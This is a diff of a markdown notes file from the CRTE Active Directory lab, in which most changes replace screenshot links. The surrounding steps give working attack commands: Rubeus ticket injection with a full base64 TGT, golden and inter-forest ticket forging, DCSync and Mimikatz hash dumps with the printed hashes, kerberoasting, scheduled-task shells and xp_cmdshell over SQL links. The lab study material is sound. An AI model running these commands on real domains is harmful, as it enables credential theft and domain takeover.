+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/4ad2b65f-5aaf-4ced-89f3-eade1b5189ac)
+
 
 
 4. We can now access the shares on *BASTION-DC*
@@ -1110,7 +1156,8 @@ PS> .\Rubeus.exe asktgs /ticket:C:\ad\tools\dump\trust_tkt.kirbi /service:cifs/b
 PS> ls \\bastion-dc.bastion.local\C$
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/22c28de1-248a-4a8f-9071-abacc4965d78)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/67e46816-b731-4a54-9f84-5df88c8eb317)
+
 
 5. Setting a listener and creating a schedule task we can spawn a shell as *BASTION-DC*
 ```powershell
@@ -1132,7 +1179,8 @@ PS> schtasks /create /S bastion-dc.bastion.local /SC Weekly /RU "NT Authority\SY
 PS> schtasks /Run /S bastion-dc.bastion.local /TN "owned"
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/a88ad4f6-333d-4159-baac-d705db4bcd9d)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/eeb127fa-5925-44c8-88bb-4bb5359b3dc4)
+
 
 
 
@@ -1152,7 +1200,8 @@ Invoke-Mimi -Command '"sekurlsa::ekeys"'
 # aes256 :: a32d8d07a45e115fa499cf58a2d98ef5bf49717af58bc4961c94c3c95fc03292
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/4617e19e-4e76-4355-9452-4b342d7a2550)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/da9ae714-cbba-4083-ac75-0661f2e1643f)
+
 
 
 
@@ -1176,7 +1225,7 @@ PS> $bastiondc = New-PSSession bastion-dc.bastion.local
 PS> Invoke-Command -ScriptBlock {Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local} -Session $bastiondc
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/dc9c8927-efdd-4375-9827-ec47aff126c4)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/524c3bb7-b3ec-4970-8cd1-1bfde980f68c)
 
 
 2. Enumerate if there is a PAM trust
@@ -1188,7 +1237,8 @@ PS> winrs -r:bastion-dc.bastion.local cmd
 PS> Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} -Server production.local
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/943f748d-01d7-4cf7-87bf-85af095fb55d)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/2f82f633-7e8c-4be6-884d-fcfab6c0d43c)
+
 
 
 3. Check which users are members of the Shadow Principals
@@ -1196,7 +1246,8 @@ PS> Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuaranti
 PS> Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $bastiondc
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/0b12a1c8-5281-45f2-8c0d-095637a4ef6a)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/bf03c15f-7a6c-4da2-9320-058d5b0e6dbe)
+
 
 
 4. Run the below command on the bastion-dc to get IP of production.local DC
@@ -1204,7 +1255,8 @@ PS> Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal 
 PS> Get-DnsServerZone -ZoneName production.local |fl *
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/d5f706da-3918-4bb4-87b7-88e20523f9b9)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/9281b75c-18ce-4167-b1b7-80dc7bc39cb4)
+
 
 5. To use PowerShell Remoting to connect to an IP address, we must modify the WSMan Trustedhosts property on the student VM. Run the below command in an elevated PowerShell on the student VM
 ```powershell
@@ -1218,7 +1270,8 @@ PS> C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:administrator /domain:ba
 PS> Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/ac9efa0d-392b-4798-b767-32d4d9b14b93)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e568c939-27bd-4f45-ac6d-5abc5ac321a0)
+
 
 
 #### 55. Domain Administrator of techcorp.local is a member of which group in bastion.local?
@@ -1285,7 +1338,8 @@ PS> echo F | xcopy C:\AD\Tools\MS-RPRN.exe \\us-web\C$\Windows\Tasks\MS-RPRN.exe
 PS> .\MS-RPRN.exe \\USVENDOR-DC.USVENDOR.local \\us-web.us.techcorp.local
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/1699205b-5667-43d2-a7ed-b54203a404b9)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/ee978e93-7d50-49a3-8fe5-7ba93bebd9a4)
+
 
 
 2. Using *Rubeus* we can inject the ticket into the session
@@ -1293,7 +1347,8 @@ PS> .\MS-RPRN.exe \\USVENDOR-DC.USVENDOR.local \\us-web.us.techcorp.local
 PS> C:\AD\Tools\Rubeus.exe ptt /ticket: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
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/386616ac-dc34-46c5-aef7-1a1f8f1fdce7)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/9abcbbb0-dadd-4cf9-9e41-a17dab1c6466)
+
 
 3. Now we can perform a DC-Sync attack and dump the *krgtgt* and *administrator* hash
 ```powershell
@@ -1314,9 +1369,11 @@ PS> C:\AD\Tools\SharpKatz.exe --Command dcsync --User USVENDOR\administrator --D
 # aes256 :: 2b0b8bf77286337369f38d1d72d3705fda18496989ab1133b401821684127
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/b3354ec8-c139-4c07-99b4-1ac25b9b3e9f)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/760e1438-d05e-48a9-ac2f-30b2d6b45e71)
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/f7247979-6465-491a-a472-1588306b08a4)
+
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/1840fe4a-71ae-44de-a41a-e99dab0a9c16)
+
 
 
 4. We can get a session as usvendor-dc
@@ -1361,7 +1418,7 @@ PS> (Get-ADForest).Domains| %{Get-ADDomain -Server $_}|select name, domainsid
 PS> C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt" "exit"
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/9cf5e73c-9d51-41bb-94c9-3396ead353c7)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/d9cf7016-2498-4948-8e41-077aa4efc056)
 
 
 2. Find user accounts used as Service account
@@ -1377,14 +1434,16 @@ PS> Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServiceP
 # spn :: eu-file.eu.local
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/df15afec-3b2d-4e04-b8c4-61a2ea06da94)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/4d5bacab-996d-4942-aca6-1f59582836cf)
+
 
 3. Request a TGS
 ```powershell
 PS> C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:euhashes.txt
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/026d0992-045b-49fa-9298-4e8e57f452b4)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/f1c9c945-231a-417d-a49f-a31f9cf5ea17)
+
 
 4. Crack the hash
 ```powershell
@@ -1402,7 +1461,8 @@ PS> C:\AD\Tools\Rubeus.exe hash /password:Qwerty@123 /user:storagesvc /domain:eu
 # domain :: eu.local 
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/b75c12fc-d270-42e0-ae8f-6bfc193086d0)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/94642087-897a-42d2-80d2-5a5a4181d759)
+
 
 
 6. After spawning a new session as storagesvc we can enumerate users with constrained delegation enabled
@@ -1418,7 +1478,8 @@ PS> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.ps
 Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server eu.local
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/349227a6-c169-4052-86e1-84b48905b7a5)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/ccedcd10-04da-4ef0-a69b-9b5d86bef3a9)
+
 
 
 7. Request an alternate ticket using Rubeus
@@ -1426,7 +1487,9 @@ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-All
 PS> C:\AD\Tools\Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:eu.local /msdsspn:"time/EU-DC.eu.local" /altservice:ldap /dc:eu-dc.eu.local /ptt
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/c226dbf3-f145-40a0-8bfa-4876ddc878a6)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/5e7ae766-0dbd-491d-8b1e-ed8188fe6027)
+
+
 
 
 8. Perform a DCSync Attack
@@ -1448,9 +1511,10 @@ PS> C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\administrator - -Domain
 # aes256 :: b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d 
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/86445121-be1b-4879-b902-5310c2835bdd)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/263058ac-6eab-4d34-9ca6-08a477ebdfff)
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e33726f3-6d2c-49ab-8d24-b9d3f24a695a)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/9ee0174c-1184-42bb-b14e-bc2db55f2fa7)
+
 
 
 9. Spawn a session with the admin creds and get a session as *EU-DC*
@@ -1465,7 +1529,8 @@ PS> Find-PSRemotingLocalAdminAccess -Verbose
 PS> winrs -r:EU-DC.EU.LOCAL cmd
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/2b376b2e-7142-49fe-95c0-15bc92dff5a5)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/81d36bd4-04a1-4627-8d96-e67efc6c532c)
+
 
 #### 40. SPN that we keberoasted in eu.local
 ```powershell
@@ -1518,7 +1583,8 @@ PS> Invoke-Mimi -Command '"lsadump::trust /patch"'
 # aes256 :: 80155032526269f1db2b12c040383e08c775d9419652f0657d1c683078e5d5eb 
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/85665520-e957-4511-bd97-aea85e89b6cf)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e0b8be95-6525-48b5-9be1-a6b400540f32)
+
 
 2. Forge the inter-forest TGT
 ```powershell
@@ -1542,7 +1608,7 @@ PS> winrs -r:EU-DC.EU.LOCAL cmd
 PS> C:\Windows\Tasks\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /sids:S-1-5-21-4066061358-3942393892-617142613-519 /rc4:8bf1ea5c07c7d434bfcee8a502abe66f /service:krbtgt /target:euvendor.local /ticket:C:\windows\tasks\trust_tkt.kirbi" "exit"
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/188dd5fb-c5bd-48c9-bfd7-254ccc968239)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e5255e6e-6c8f-4e2e-b1cf-d8c3f496e8b0)
 
 
 3. Create ticket and add it into the memory using asktgs
@@ -1553,7 +1619,8 @@ PS> C:\Windows\Tasks\Rubeus.exe asktgs /ticket:C:\windows\tasks\trust_tkt.kirbi 
 PS> klist
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/9ce180be-f382-4a0b-9ca1-584fc06902f0)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/959ed76f-7a1a-4a82-8e7d-e5f5ddde3607)
+
 
 
 4.  Now we can access the *eushare*
@@ -1562,7 +1629,8 @@ PS> ls \\euvendor-dc.euvendor.local\eushare
 PS> cat \\euvendor-dc.euvendor.local\eushare\shared.txt
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/a9b0c9c5-aaea-4f86-8307-dc607ecc884b)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/6b3b78b3-817a-4fae-9c1f-32427e863e7a)
+
 
 #### 46. Name of the share on euvednor-dc that we can access
 ```powershell
@@ -1598,7 +1666,8 @@ PS> C:\Users\Public\RunWithRegistryNonAdmin.bat
 PS> Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"' -Server euvendor.local
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e1218505-18d0-450e-a65d-c5886764a8b7)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e94e8c05-520d-4168-8617-d628b9da2d7d)
+
 
 
 2. Forge the inter-forest TGT
@@ -1606,7 +1675,8 @@ PS> Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"
 PS> C:\windows\tasks\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /rc4:8bf1ea5c07c7d434bfcee8a502abe66f /service:krbtgt /target:euvendor.local /ticket:C:\windows\tasks\trust_tkt.kirbi" "exit"
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/c3388477-456b-4960-9984-670780751628)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/5bb33a8e-2d83-4a8a-baea-fd374f7799a8)
+
 
 
 3. Create ticket and add it into the memory using asktgs
@@ -1614,14 +1684,16 @@ PS> C:\windows\tasks\BetterSafetyKatz.exe "kerberos::golden /user:Administrator 
 PS> C:\windows\tasks\Rubeus.exe asktgs /ticket:C:\windows\tasks\trust_tkt.kirbi /service:HTTP/euvendor-net.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/80db991c-d828-4e0f-95cd-3690ac2aa4b3)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e5151a76-e13d-4e6b-a392-2e399664673e)
+
 
 4. Access *EUVendor-Net* using *winrs*
 ```powershell
 PS> winrs -r:euvendor-net.euvendor.local cmd
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/5eac5ce7-6d0c-40e7-b950-3b1a636c79f1)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/4284f379-7ab2-4c40-831f-d9130465067d)
+
 
 
 #### 48. Name of the group that has SID > 1000 in euvendor.local
@@ -1655,7 +1727,8 @@ PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'
 # aes256_hmac :: cbcd3ce3bdb3b03bc85d54d3b115eb5ab5e3f2afa1576d0c6751f625943068b1
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/1e1655dc-8b2c-411f-88f1-2ed789e0bcb7)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/76325b5c-6f95-4ccb-82e6-f16f3727687f)
+
 
 
 <h1 style='color:lightblue'> 17 - DB-SQLPROD.DB.LOCAL -> 18 - DB-SQLSRV.DB.LOCAL </h1>
@@ -1671,7 +1744,8 @@ PS> Import-Module .\PowerUpSQL.psd1
 PS> Get-SQLInstanceDomain
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/6b0673d4-75ff-4ae0-a784-a8c5b3cb1fb0)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/d8603823-1379-4700-9d57-7236a4a8a925)
+
 
 
 
@@ -1680,7 +1754,8 @@ PS> Get-SQLInstanceDomain
 PS> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/b0e9c51d-9bf7-4eee-af7f-0d5a0922f9a9)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/c1764280-1a4a-47c3-82d7-2a195d4dd186)
+
 
 
 3. We can see that the instance is accessible. We can check the privileges now.
@@ -1688,7 +1763,8 @@ PS> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
 PS> Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/732d34e9-a8c8-40d3-9d38-2869ad87b86c)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/be432a29-1cfb-439b-9aa7-004f8d0c0d57)
+
 
 
 4. So we have non-sysadmin access to us-mssql. Let's enumerate database links for us-mssql
@@ -1696,7 +1772,8 @@ PS> Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 PS> Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/4964c179-63f2-40b7-b3e3-89b70c4eb970)
+![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/fb735b9b-64fe-4e58-a05f-523e5f11a5d8)
+
 
 
 5. We can also use Get-SQLServerLinkCrawl from PowerUpSQL for crawling the database links automatically
@@ -1704,7 +1781,7 @@ PS> Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose
 PS> Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Verbose
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/4284ad73-5312-4c74-8975-a8897eed080b)
+
 
 
 6. So, we do have database links to other SQL Servers. If xp_cmdshell is enabled (or rpcout is true that allows us to enable xp_cmdshell), it is possible to execute commands on any node in the database links using the below commands
@@ -1713,7 +1790,7 @@ PS> Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query "exec mas
 PS> Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query "exec master..xp_cmdshell 'hostname'" | ft
 ```
 
-![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/f53b7335-f4e5-4475-8b6a-4995d9714b81)
+
 
 > Looks like we can run operating system commands on DB-SQLPROD instance.
 
